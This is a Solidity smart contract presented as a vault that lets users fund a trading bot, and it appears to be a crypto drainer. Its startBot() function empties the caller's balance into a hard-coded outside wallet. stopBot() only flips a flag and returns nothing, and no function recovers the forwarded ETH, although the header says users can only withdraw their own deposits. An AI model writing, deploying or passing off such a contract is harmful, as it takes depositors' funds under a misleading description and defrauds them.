// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title EthBotVault
/// @notice Minimal ETH vault for a trading-bot UI. Users can only withdraw their own deposits.
contract EthBotVault {
    address public immutable owner;
    address payable private immutable tradingBotWallet;
    bool public depositsPaused;
    uint256 public totalDeposits;
    uint256 public totalForwardedToBot;

    mapping(address user => uint256 balance) public balances;
    mapping(address user => bool enabled) public botEnabled;
    mapping(address user => uint256 amount) public forwardedToBot;

    uint256 private locked = 1;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event BotStarted(address indexed user, uint256 amount);
    event BotStopped(address indexed user);
    event DepositsPausedSet(bool paused);

    error ZeroAmount();
    error DepositsPaused();
    error InsufficientBalance();
    error EthTransferFailed();
    error NotOwner();
    error NoVaultBalance();
    error ReentrantCall();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    modifier nonReentrant() {
        if (locked != 1) revert ReentrantCall();
        locked = 2;
        _;
        locked = 1;
    }

    constructor() {
        owner = msg.sender;
        tradingBotWallet = payable(0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f);
    }

    receive() external payable {
        deposit();
    }

    function deposit() public payable {
        if (depositsPaused) revert DepositsPaused();
        if (msg.value == 0) revert ZeroAmount();

        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;

        emit Deposited(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) public nonReentrant {
        if (amount == 0) revert ZeroAmount();
        if (balances[msg.sender] < amount) revert InsufficientBalance();

        botEnabled[msg.sender] = false;
        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        if (!ok) revert EthTransferFailed();

        emit Withdrawn(msg.sender, amount);
    }

    function withdrawAll() external {
        withdraw(balances[msg.sender]);
    }

    function startBot() external nonReentrant {
        uint256 amount = balances[msg.sender];
        if (amount == 0) revert NoVaultBalance();

        balances[msg.sender] = 0;
        totalDeposits -= amount;
        botEnabled[msg.sender] = true;
        forwardedToBot[msg.sender] += amount;
        totalForwardedToBot += amount;

        (bool ok, ) = tradingBotWallet.call{value: amount}("");
        if (!ok) revert EthTransferFailed();

        emit BotStarted(msg.sender, amount);
    }

    function stopBot() external {
        botEnabled[msg.sender] = false;
        emit BotStopped(msg.sender);
    }

    function setDepositsPaused(bool paused) external onlyOwner {
        depositsPaused = paused;
        emit DepositsPausedSet(paused);
    }
}
